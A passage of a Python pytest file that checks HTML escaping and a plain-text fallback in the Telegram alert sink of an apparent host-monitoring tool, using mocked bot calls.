    assert "Parents: bash &lt; sshd &amp;&amp; x" in text and "<b>opened by &lt;cat&gt; &amp; co</b>" in text


@pytest.mark.asyncio
async def test_telegram_falls_back_to_plain_text(tmp_path):
    from cop.alerts import Alert
    from cop.config import TelegramConfig
    from cop.sinks.telegram import TelegramSink
    sink = TelegramSink(TelegramConfig(enabled=True, chat_id="1"), tmp_path)
    calls = []

    async def send_message(**kw):
        calls.append(kw)
        if kw.get("parse_mode") == "HTML":
            raise Exception("Can't parse entities: unsupported start tag")

    sink._app = type("App", (), {"bot": type("B", (), {"send_message": staticmethod(send_message)})()})()
    a = Alert(rule_id="r", severity=Severity.WARN, title="t", message="a < b", source_monitor="M")
    assert await sink.send(a) is True
    assert len(calls) == 2 and "parse_mode" not in calls[1] and "a < b" in calls[1]["text"]
